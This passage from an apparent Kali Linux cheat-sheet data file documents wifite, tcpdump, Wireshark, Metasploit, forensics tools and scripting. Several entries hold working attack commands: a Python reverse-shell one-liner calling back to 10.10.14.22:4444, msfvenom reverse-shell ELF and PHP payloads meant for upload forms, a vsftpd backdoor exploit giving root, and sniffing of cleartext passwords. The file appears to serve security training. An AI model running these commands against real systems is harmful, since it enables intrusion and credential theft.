      { flag: '-dict <file>', description: 'Specify wordlist dictionary for instant handshake cracking' },
    ],
    advantages: [
      'Fully automated workflow orchestrating aircrack-ng, reaver, bully, and tshark.',
    ],
    disadvantages: [
      'Automated deauthentication can disrupt all devices on the target access point.',
    ],
    whatNotToDo: [
      'Do not fire automated tools in public environments without knowing the exact BSSID of your authorized lab target.',
    ],
    advancedExample: {
      command: 'sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt -mac',
      explanation: 'Automated audit with MAC address spoofing and instant dictionary evaluation.',
      output: `[+] Handshake saved to hs/handshake_HomeLab.cap`,
    },
    proTip: "Use the `-mac` flag with Wifite to randomize your wireless card's MAC address before sending association frames, preventing physical location attribution during authorized lab audits.",
    tags: ['wifite', 'wifi', 'automation', 'handshake', 'wireless'],
  },

  // ==========================================
  // TRAFFIC ANALYSIS & SNIFFING
  // ==========================================
  {
    id: 'tcpdump',
    name: 'tcpdump',
    syntax: 'sudo tcpdump [options] [filter_expression]',
    categoryId: 'traffic-analysis',
    level: 'intermediate',
    howItWorks: "Puts a wiretap on your network card. As data packets fly across the wire, it prints their sender, receiver, protocol, and raw contents directly to your terminal.",
    purpose: "Command-line packet capture, troubleshooting network services, recording evidence to PCAP files, and sniffing unencrypted traffic.",
    example: 'sudo tcpdump -i eth0 -nn -c 5 port 80',
    sampleOutput: `listening on eth0, link-type EN10MB, snapshot length 262144 bytes
14:40:02 IP 192.168.1.142.45102 > 93.184.216.34.80: Flags [S], seq 312048
14:40:02 IP 93.184.216.34.80 > 192.168.1.142.45102: Flags [S.], seq 890124
14:40:02 IP 192.168.1.142.45102 > 93.184.216.34.80: Flags [.], ack 1
5 packets captured`,
    flags: [
      { flag: '-i <iface>', description: 'Listen on specified network interface (e.g. eth0, wlan0, any)' },
      { flag: '-nn', description: 'Do not resolve hostnames or port names to text (runs much faster)' },
      { flag: '-c <count>', description: 'Exit after receiving specified number of packets' },
      { flag: '-w <file.pcap>', description: 'Write raw packets to a PCAP file for Wireshark inspection' },
      { flag: '-X', description: 'Print packet payload in both Hex and ASCII text format' },
    ],
    advantages: [
      'Extremely lightweight; available on virtually all Linux servers without needing a GUI.',
      'Uses Berkeley Packet Filter (BPF) syntax for high-speed packet filtering.',
    ],
    disadvantages: [
      'Terminal stream is difficult to read for complex multi-layered protocols like TLS or SMB.',
    ],
    whatNotToDo: [
      'Do not forget `-nn`; DNS lookup delays on thousands of captured packets will drop frames.',
    ],
    advancedExample: {
      command: 'sudo tcpdump -i eth0 -A -s 0 \'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)\'',
      explanation: 'Sniffs unencrypted HTTP traffic and prints only packets that contain actual payload data (passwords, URLs).',
      output: `POST /login.php HTTP/1.1\nHost: target.lab\nuser=admin&pass=secret123`,
    },
    proTip: "To prevent packet loss on high-throughput interfaces, combine `-nn` with a larger memory buffer: `sudo tcpdump -i eth0 -nn -B 4096 -w capture.pcap`.",
    tags: ['tcpdump', 'packets', 'sniffing', 'pcap', 'bpf'],
  },
  {
    id: 'wireshark',
    name: 'Wireshark',
    syntax: 'wireshark [file.pcap] &',
    categoryId: 'traffic-analysis',
    level: 'beginner',
    howItWorks: "A high-powered colorful microscope for network data. It color-codes every web page, DNS lookup, and chat message so you can dissect protocols frame by frame.",
    purpose: "Deep protocol inspection, malware traffic analysis, reconstructing cleartext files from PCAP traces, and analyzing security incidents.",
    example: 'wireshark capture_lab.pcap &',
    sampleOutput: `[+] Wireshark GUI opened.
[+] Loaded 14,291 packets from capture_lab.pcap
[+] Display filters ready (e.g. http.request.method == "POST" || tcp.port == 443)`,
    flags: [
      { flag: 'Display Filter', description: 'Filter packets live without re-capturing (e.g. ip.addr == 10.0.0.1)' },
      { flag: 'Follow TCP Stream', description: 'Right-click a packet to reconstruct entire plaintext conversation' },
      { flag: 'Export Objects', description: 'Save images, documents, and executables directly from HTTP/SMB streams' },
      { flag: 'Statistics Menu', description: 'View protocol hierarchy, conversation endpoints, and bandwidth graphs' },
    ],
    advantages: [
      'Incredible protocol dissection engine recognizing thousands of network protocols.',
      'Visual timeline and conversation reassembly makes forensics accessible.',
    ],
    disadvantages: [
      'Memory intensive when loading large multi-gigabyte PCAP files.',
    ],
    whatNotToDo: [
      'Do not run Wireshark as root! Running complex protocol dissectors as root exposes your machine to memory corruption bugs.',
    ],
    advancedExample: {
      command: 'File > Export Objects > HTTP',
      explanation: 'Extracts all downloaded files, executables, or images directly from unencrypted web traffic in a PCAP.',
      output: `Extracted 12 images, 2 pdf documents, and 1 binary from stream.`,
    },
    proTip: "Use `Follow TCP Stream` (Ctrl+Alt+Shift+T) on any HTTP, Telnet, or FTP packet to read the entire two-way session transcript in plain text.",
    tags: ['wireshark', 'packets', 'forensics', 'pcap', 'gui'],
  },

  // ==========================================
  // METASPLOIT BASICS
  // ==========================================
  {
    id: 'msfconsole',
    name: 'msfconsole',
    syntax: 'msfconsole [options]',
    categoryId: 'metasploit',
    level: 'intermediate',
    howItWorks: "The command center of ethical hacking. A giant organized control room loaded with thousands of verified exploits, scanners, and payloads ready to assemble like Lego bricks.",
    purpose: "Vulnerability verification, launching exploits against identified services, managing listener handlers, and coordinating post-exploitation sessions.",
    example: 'msfconsole -q',
    sampleOutput: `msf6 > search vsftpd 2.3.4
Matching Modules:
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03  excellent  Yes

msf6 > use 0
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.180
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] Found shell.
id
uid=0(root) gid=0(root)`,
    flags: [
      { flag: '-q', description: 'Quiet: skips the large ASCII banner on startup to load faster' },
      { flag: 'search <term>', description: 'Find modules by CVE number, author, platform, or service name' },
      { flag: 'use <module>', description: 'Select an exploit, auxiliary scanner, or post module' },
      { flag: 'show options', description: 'Display required settings (RHOSTS, RPORT, LHOST, LPORT)' },
      { flag: 'set <key> <val>', description: 'Assign value to a setting (e.g. set RHOSTS 10.10.10.5)' },
      { flag: 'exploit / run', description: 'Launch the module against the target host' },
    ],
    advantages: [
      'Comprehensive, modular framework maintained by Rapid7 and the global security community.',
      'Includes database integration for storing discovered hosts, services, and credentials.',
    ],
    disadvantages: [
      'Default payloads are well-known and immediately flagged by modern Endpoint Detection and Response (EDR).',
    ],
    whatNotToDo: [
      'Never launch exploits blind without verifying service versions; crashing target services causes Denial of Service.',
    ],
    advancedExample: {
      command: 'msf6 > use exploit/multi/handler\nmsf6 > set payload linux/x64/meterpreter/reverse_tcp\nmsf6 > set LHOST 10.10.14.22\nmsf6 > run -j',
      explanation: 'Starts a background multi-handler listener waiting for incoming reverse shells.',
      output: `[*] Exploit running as background job 0.\n[*] Started reverse TCP handler on 10.10.14.22:4444`,
    },
    proTip: "Speed up Metasploit module searches from 15 seconds to 100 milliseconds by initializing the PostgreSQL database cache with `sudo msfdb init` before running `msfconsole`.",
    tags: ['metasploit', 'msfconsole', 'payload', 'exploit', 'rce'],
  },
  {
    id: 'msfvenom',
    name: 'msfvenom',
    syntax: 'msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <file>',
    categoryId: 'metasploit',
    level: 'intermediate',
    howItWorks: "A craft shop that builds custom helper scripts (like reverse shells) and shapes them into executable packages (.exe, .elf, .war, .php, Python, or shellcode).",
    purpose: "Generating standalone reverse shells, bind shells, and custom shellcode to embed inside exploits or upload to web applications.",
    example: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.142 LPORT=4444 -f elf -o shell.elf',
    sampleOutput: `[-] No arch selected, selecting arch: x64 from payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: shell.elf`,
    flags: [
      { flag: '-p <payload>', description: 'Specify payload (e.g. windows/x64/meterpreter/reverse_tcp)' },
      { flag: 'LHOST=<ip>', description: 'Listening IP on your Kali machine that receives the connection' },
      { flag: 'LPORT=<port>', description: 'Listening port on your Kali machine' },
      { flag: '-f <format>', description: 'Output format (elf, exe, raw, asp, war, php, python)' },
      { flag: '-e <encoder>', description: 'Encoder to obfuscate bad characters (e.g. x86/shikata_ga_nai)' },
      { flag: '-b <badchars>', description: 'Exclude bad characters from shellcode (e.g. \\x00 for null byte)' },
    ],
    advantages: [
      'Supports hundreds of payload variations across Windows, Linux, Android, and macOS.',
      'Outputs in dozens of script and binary formats.',
    ],
    disadvantages: [
      'Default unencoded msfvenom signatures are flagged by Windows Defender and antivirus.',
    ],
    whatNotToDo: [
      'Do not mix staged payloads (`windows/shell/reverse_tcp`) with stageless listeners (`windows/shell_reverse_tcp`).',
    ],
    advancedExample: {
      command: 'msfvenom -p php/reverse_php LHOST=10.10.14.22 LPORT=4444 -f raw -o shell.php',
      explanation: 'Generates a clean PHP reverse shell for uploading to vulnerable web upload forms.',
      output: `Saved as: shell.php (Payload size: 3012 bytes)`,
    },
    proTip: "Pay close attention to slashes in payload names: `linux/x64/shell_reverse_tcp` (single underscore) is stageless (all in one), while `linux/x64/shell/reverse_tcp` is staged (downloads second stage). Your listener must match exactly.",
    tags: ['msfvenom', 'payload', 'shellcode', 'reverse-shell', 'meterpreter'],
  },

  // ==========================================
  // DIGITAL FORENSICS & ARTIFACTS
  // ==========================================
  {
    id: 'binwalk',
    name: 'binwalk',
    syntax: 'binwalk [options] <file>',
    categoryId: 'forensics',
    level: 'intermediate',
    howItWorks: "An X-ray machine for mystery files and router firmware. Finds hidden secret files, compressed folders, and bootloader images glued inside another file.",
    purpose: "Firmware analysis, Internet of Things (IoT) reverse engineering, and extracting hidden steganography payloads from images.",
    example: 'binwalk -e firmware.bin',
    sampleOutput: `DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             TRX firmware header, image size: 7929856 bytes
28            0x1C            LZMA compressed data
1048576       0x100000        Squashfs filesystem, little endian, size: 6878342 bytes`,
    flags: [
      { flag: '-e / --extract', description: 'Automatically carve and extract known file types into a folder' },
      { flag: '-M / --matryoshka', description: 'Recursively scan and extract files found inside extracted archives' },
      { flag: '-B / --signature', description: 'Scan target file for common magic byte file signatures' },
      { flag: '-E / --entropy', description: 'Calculate file entropy to spot encrypted or compressed sections' },
    ],
    advantages: [
      'Identifies and extracts proprietary and open embedded file systems (SquashFS, cramfs, JFFS2).',
    ],
    disadvantages: [
      'Cannot automatically decrypt firmware protected by custom AES cryptographic keys.',
    ],
    whatNotToDo: [
      'Do not run recursive extraction (`-M`) on corrupt firmware without monitoring disk space.',
    ],
    advancedExample: {
      command: 'binwalk -E suspicious_firmware.bin',
      explanation: 'Plots an entropy graph to identify encrypted vs plain-text sections in a binary.',
      output: `Entropy analysis complete. High entropy (>0.9) detected at offset 0x20000.`,
    },
    proTip: "Combine `-E` (entropy scan) with `-e` (extraction). An entropy plateau nearing 1.0 indicates encrypted code, pinpointing where proprietary vendor encryption starts.",
    tags: ['binwalk', 'firmware', 'forensics', 'carving', 'reversing'],
  },
  {
    id: 'exiftool',
    name: 'exiftool',
    syntax: 'exiftool [options] <file>',
    categoryId: 'forensics',
    level: 'beginner',
    howItWorks: "Reads the hidden camera diary saved inside photos and documents: camera model, exact timestamp, lens settings, and GPS coordinates of where you stood.",
    purpose: "Digital forensics, OSINT investigations from photos, metadata sanitization, and document analysis.",
    example: 'exiftool evidence_photo.jpg',
    sampleOutput: `File Name                       : evidence_photo.jpg
Camera Model Name               : iPhone 14 Pro
Date/Time Original              : 2026:10:25 15:42:10
GPS Latitude                    : 37 deg 46' 30.12" N
GPS Longitude                   : 122 deg 25' 10.45" W
GPS Position                    : 37 deg 46' 30.12" N, 122 deg 25' 10.45" W`,
    flags: [
      { flag: '-all=', description: 'Delete all metadata from a file to protect privacy before sharing' },
      { flag: '-csv', description: 'Export metadata of all files in directory into a CSV spreadsheet' },
      { flag: '-gps:all', description: 'Extract only GPS geographical location metadata' },
      { flag: '-overwrite_original', description: 'Do not create backup `_original` files when editing metadata' },
    ],
    advantages: [
      'Supports hundreds of file formats (JPEG, PNG, PDF, DOCX, MP4, RAW).',
      'Extremely fast for bulk OSINT metadata gathering.',
    ],
    disadvantages: [
      'Social media platforms (Twitter, Instagram) strip EXIF metadata upon upload.',
    ],
    whatNotToDo: [
      'Never send client deliverables or report screenshots containing unstripped customer metadata.',
    ],
    advancedExample: {
      command: 'exiftool -all= -overwrite_original report_screenshot.png',
      explanation: 'Strips all hidden author, timestamp, and device metadata from an evidence image.',
      output: `1 image files updated.`,
    },
    proTip: "Before publishing evidence screenshots or client deliverables, always run `exiftool -all= -overwrite_original *.png` to scrub personal usernames, camera serials, and geolocation data.",
    tags: ['exiftool', 'metadata', 'images', 'forensics', 'osint'],
  },
  {
    id: 'autopsy',
    name: 'Autopsy',
    syntax: 'autopsy &',
    categoryId: 'forensics',
    level: 'intermediate',
    howItWorks: "A digital detective dashboard for hard drives and smartphones. It reconstructs deleted files, web browser history, chat logs, and email databases into an easy graphical interface.",
    purpose: "Digital incident response (DFIR), investigating compromised hard drive images, and conducting legal forensic examinations.",
    example: 'autopsy &',
    sampleOutput: `[+] Autopsy server launched.
[+] Open browser to http://localhost:9999/autopsy
[+] Case database ready for disk image import.`,
    flags: [
      { flag: 'Disk Image Import', description: 'Load raw (.dd), E01, or virtual machine disks (.vmdk)' },
      { flag: 'Ingest Modules', description: 'Automates hash lookup, keyword indexing, and web artifact parsing' },
      { flag: 'Timeline Analysis', description: 'Displays graphic activity timeline of file creations and deletions' },
    ],
    advantages: [
      'Comprehensive open-source digital forensic platform based on The Sleuth Kit (TSK).',
      'Provides legally sound, reproducible forensic reports.',
    ],
    disadvantages: [
      'Requires substantial RAM and disk storage when processing large disk images.',
    ],
    whatNotToDo: [
      'Never mount or analyze original physical evidence drives directly; ALWAYS work from a verified forensic image (`.E01` or `.dd`).',
    ],
    advancedExample: {
      command: 'autopsy',
      explanation: 'Starts the browser-based forensic analysis server for processing E01 forensic images.',
      output: `Autopsy Forensic Browser running at http://127.0.0.1:9999`,
    },
    proTip: "Always calculate and verify SHA-256 hashes of forensic disk images before importing into Autopsy to prove evidence integrity and maintain strict legal chain of custody.",
    tags: ['autopsy', 'forensics', 'disk', 'evidence', 'dfir'],
  },

  // ==========================================
  // SCRIPTING & AUTOMATION
  // ==========================================
  {
    id: 'bash-automation',
    name: 'Bash Ping Sweep & Automation',
    syntax: 'for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i | grep "64 bytes" & done',
    categoryId: 'scripting',
    level: 'intermediate',
    howItWorks: "A lightning conveyor belt. Spawns 254 simultaneous background workers to say hello to every IP on the local subnet at the exact same moment to see who answers.",
    purpose: "Rapid host discovery, log parsing, automated scanning pipelines, and quick one-liners when external tools like Nmap are not installed.",
    example: 'for i in {1..10}; do ping -c 1 -W 1 192.168.1.$i & done',
    sampleOutput: `64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=1.21 ms
64 bytes from 192.168.1.5: icmp_seq=1 ttl=128 time=2.14 ms
64 bytes from 192.168.1.8: icmp_seq=1 ttl=64 time=1.84 ms`,
    flags: [
      { flag: '{1..254}', description: 'Brace expansion generating numbers from 1 to 254' },
      { flag: '&', description: 'Pushes process into background subshell to run in parallel' },
      { flag: '-W 1', description: 'Sets 1-second timeout per packet so dead IPs do not block' },
    ],
    advantages: [
      'Runs natively on any Unix/Linux box with zero external dependencies installed.',
      'Executes in seconds due to parallel background jobs (`&`).',
    ],
    disadvantages: [
      'Launching thousands of simultaneous subshells can trigger process limit ceilings (fork bombs).',
    ],
    whatNotToDo: [
      'Do not forget the timeout flag (`-W 1`); without it, dead IPs hang background jobs indefinitely.',
    ],
    advancedExample: {
      command: 'for ip in $(cat ips.txt); do nmap -sS -p 22,80,443 -oN scan_$ip.txt $ip; done',
      explanation: 'Iterates through a list of target IP addresses, performing structured scans and saving isolated output reports.',
      output: `Scanned 15 hosts and generated 15 isolated reports.`,
    },
    proTip: "Use `wait` at the end of parallel Bash loops (e.g. `for ...; do ... & done; wait`) to ensure all background child processes finish before your script continues to parse the output.",
    tags: ['bash', 'scripting', 'pingsweep', 'automation', 'loop'],
  },
  {
    id: 'python-automation',
    name: 'Python Socket Scanner & HTTP',
    syntax: 'python3 -c "import socket; s=socket.socket(); s.connect((\'10.10.10.5\', 80)); print(\'Port Open\')"',
    categoryId: 'scripting',
    level: 'intermediate',
    howItWorks: "Using Python's raw networking libraries to open direct TCP sockets, craft custom packets, parse web responses, or spin up instant local HTTP web servers.",
    purpose: "Building custom port scanners, exploit proof-of-concepts, automated brute-forcers, and staging files across penetration testing targets.",
    example: 'python3 -m http.server 8000',
    sampleOutput: `Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.1.180 - - [30/Oct/2026 15:10:00] "GET /linpeas.sh HTTP/1.1" 200 -`,
    flags: [
      { flag: '-m http.server [port]', description: 'Spawns instant HTTP server in current working directory' },
      { flag: '-c "<code>"', description: 'Executes inline Python code string directly from shell' },
      { flag: '-b <ip>', description: 'Bind HTTP server to specific IP (e.g. 127.0.0.1 for local only)' },
    ],
    advantages: [
      'Clean, readable syntax with massive security library ecosystem (Requests, Scapy, Pwntools).',
      'Python 3 comes pre-installed on Kali Linux and most enterprise servers.',
    ],
    disadvantages: [
      'Default `http.server` is unencrypted and single-threaded.',
    ],
    whatNotToDo: [
      'Never leave Python HTTP servers running indefinitely on untrusted network segments; anyone can download your folder contents.',
    ],
    advancedExample: {
      command: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.22",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'',
      explanation: 'The classic Python one-liner interactive reverse shell with PTY pseudo-terminal spawn.',
      output: `Connection established to 10.10.14.22:4444`,
    },
    proTip: "When you receive a raw reverse shell on Kali, upgrade it to a fully interactive PTY terminal using Python: `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'`. This enables Tab auto-completion, Ctrl+C handling, and clear screen.",
    tags: ['python', 'scripting', 'socket', 'automation', 'reverse-shell'],
  },

  // ==========================================
  // TERMUX & NETHUNTER TIPS
  // ==========================================
  {
    id: 'nethunter',
    name: 'Kali NetHunter & Termux Tips',
    syntax: 'nethunter [kex | -r]',
    categoryId: 'nethunter-tips',
    level: 'advanced',
    howItWorks: "Puts the entire power of Kali Linux inside an Android phone. Runs Kali in a chroot/proot container, allowing full desktop use via NetHunter KeX (VNC) or terminal use via Termux.",
    purpose: "Portable pocket penetration testing, physical security assessments, BadUSB HID keyboard simulation, and wireless sniffing on mobile devices.",
    example: 'nethunter kex &',
    sampleOutput: `[+] Starting Kali NetHunter KeX (Desktop VNC Server)...
[+] KeX server running on port 5901.
[+] Connect via NetHunter KeX app at 127.0.0.1:5901 to view full XFCE desktop!`,
    flags: [
      { flag: 'kex', description: 'Launches NetHunter Desktop Experience (VNC graphical session)' },
      { flag: '-r', description: 'Launches NetHunter shell as root inside Android container' },
      { flag: 'nh', description: 'Shortcut in Termux to enter Kali command-line shell' },
    ],
    advantages: [
      'Full Kali toolkit running on lightweight, discreet mobile phone hardware.',
      'Supports BadUSB attacks to emulate keyboard keystrokes when plugged into target PCs.',
    ],
    disadvantages: [
      'Packet injection and monitor mode require specific external OTG Wi-Fi adapters with Atheros or Ralink chipsets.',
    ],
    whatNotToDo: [
      'Do not draw heavy current by plugging USB SDRs or Wi-Fi antennas directly without an external battery Y-cable; it crashes phone kernels.',
    ],
    advancedExample: {
      command: 'nethunter kex stop && nethunter kex start',
      explanation: 'Restarts the mobile graphical VNC session if the screen becomes frozen or unresponsive.',
      output: `VNC server stopped.\nStarting new VNC server on display :1 (port 5901)`,
    },
    proTip: "In Termux/NetHunter, always install `kali-tweaks` and run `nethunter-root` to grant full raw socket capabilities when running Nmap or raw packet tools on Android.",
    tags: ['nethunter', 'termux', 'android', 'mobile', 'kali'],
  },
  {
    id: 'kali-troubleshoot',
    name: 'Kali Maintenance & Troubleshooting',
    syntax: 'sudo apt update && sudo apt full-upgrade -y && sudo apt autoremove -y',
    categoryId: 'nethunter-tips',
    level: 'beginner',
    howItWorks: "The health tune-up ritual for Kali Linux. Synchronizes package lists, safely upgrades kernel headers, fixes broken dependencies, and cleans out old unneeded files.",
    purpose: "Preventing broken package states, updating exploit databases, and maintaining system stability on Kali rolling release.",
    example: 'sudo apt update && sudo apt full-upgrade -y',
    sampleOutput: `Reading package lists... Done
Calculating upgrade... Done
12 upgraded, 0 newly installed, 0 to remove.`,
    flags: [
      { flag: 'full-upgrade', description: 'Intelligently manages dependencies for major rolling updates' },
      { flag: 'autoremove', description: 'Removes orphaned libraries and unneeded old kernel images' },
      { flag: '--fix-broken install', description: 'Repairs broken dependencies if an install was interrupted' },
    ],
    advantages: [
      'Keeps Exploit-DB, Metasploit, Nmap scripts, and kernel drivers synchronized.',
    ],
    disadvantages: [
      'Large rolling upgrades can take 15+ minutes on slower internet connections.',
    ],
    whatNotToDo: [
      'NEVER run `apt-get dist-upgrade` without checking what packages will be removed.',
    ],
    advancedExample: {
      command: 'sudo dpkg --configure -a && sudo apt --fix-broken install',
      explanation: 'Fixes corrupted or interrupted package installations that lock the apt database.',
      output: `Setting up pending packages...\nAll dependencies resolved cleanly.`,
    },
    proTip: "If you ever get the error `E: Could not get lock /var/lib/dpkg/lock-frontend`, check if another updater is running with `ps aux | grep apt`. If stuck after a crash, verify no process is running before removing the lock file.",
    tags: ['kali', 'troubleshooting', 'upgrade', 'maintenance', 'apt'],
  },
];
